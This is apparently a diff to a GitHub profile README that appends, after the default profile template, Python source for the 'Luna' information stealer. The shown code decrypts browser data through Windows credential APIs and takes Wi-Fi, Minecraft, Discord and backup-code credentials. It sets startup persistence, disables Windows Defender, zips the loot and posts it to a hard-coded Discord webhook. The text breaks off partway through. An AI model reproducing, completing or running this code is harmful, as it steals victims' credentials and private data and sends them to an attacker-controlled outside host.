@@ -1,0 +1,113 @@
+- 👋 Hi, I’m @ODaicuciprian32
+- 👀 I’m interested in ...
+- 🌱 I’m currently learning ...
+- 💞️ I’m looking to collaborate on ...
+- 📫 How to reach me ...
+- 😄 Pronouns: ...
+- ⚡ Fun fact: ...
+
+<!---
+ODaicuciprian32/ODaicuciprian32 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+You can click the Preview link to take a look at your changes.
+--->
+import base64
+import concurrent.futures
+import ctypes
+import json
+import os
+import random
+import re
+import sqlite3
+import subprocess
+import sys
+import threading
+import time
+from multiprocessing import cpu_count
+from shutil import copy2
+from zipfile import ZIP_DEFLATED, ZipFile
+
+import psutil
+import requests
+from Cryptodome.Cipher import AES
+from PIL import ImageGrab
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from win32crypt import CryptUnprotectData
+
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1217910831820439614/X_M6kPadf8nvOtzkG2ZyJpTdxLP4mVu8AXwKUQVS43WEc9p7nfKgwDZ-2uyTljRaDr6S', 'ping': False, 'pingtype': 'Here', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': False, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False}
+
+#global variables
+temp = os.getenv("temp")
+temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
+os.mkdir(temp_path)
+localappdata = os.getenv("localappdata")
+
+
+def main(webhook: str):
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    configcheck(threads)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
+        executor.map(lambda func: func(), threads)
+
+    zipup()
+
+    data = {
+        "username": "Luna",
+        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+    }
+
+    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+
+    if __CONFIG__["ping"]:
+        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
+            content = f"@{__CONFIG__['pingtype'].lower()}"
+            data.update({"content": content})
+
+    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
+        with open(_file, 'rb') as file:
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
+            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
+    else:
+        requests.post(webhook, json=data)
+
+    if __CONFIG__["systeminfo"]:
+        PcInfo()
+
+    if __CONFIG__["discord"]:
+        Discord()
+
+    os.remove(_file)
+
+
+def Luna(webhook: str):
+    if __CONFIG__["anti_spam"]:
+        AntiSpam()
+
+    if __CONFIG__["antidebug_vm"]:
+        Debug()
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        if __CONFIG__["injection"]:
+            executor.submit(Injection, webhook)
+        executor.submit(main, webhook)
+
+    if __CONFIG__["self_destruct"]:
+        SelfDestruct()
+
+
+def configcheck(list):
+    if not __CONFIG__["error"]:
+        list.remove(fakeerror)
+    if not __CONFIG__["startup"]:
+        list.remove(startup)
+    if not __CONFIG__["defender"]:
+        list.remove(disable_defender)
+    if not __CONFIG__["browser"]:
+        list.remove(Browsers)
+    if not __CONFIG__["wifi"]:
+        list.remove(Wifi)
+    if not __CONFIG__["minecraft"]:
+        list.remove(Minecraft)
+    if not __CONFIG__["backupcodes"]:
+        list.remove(BackupCodes)
+... (3 KB rămași)
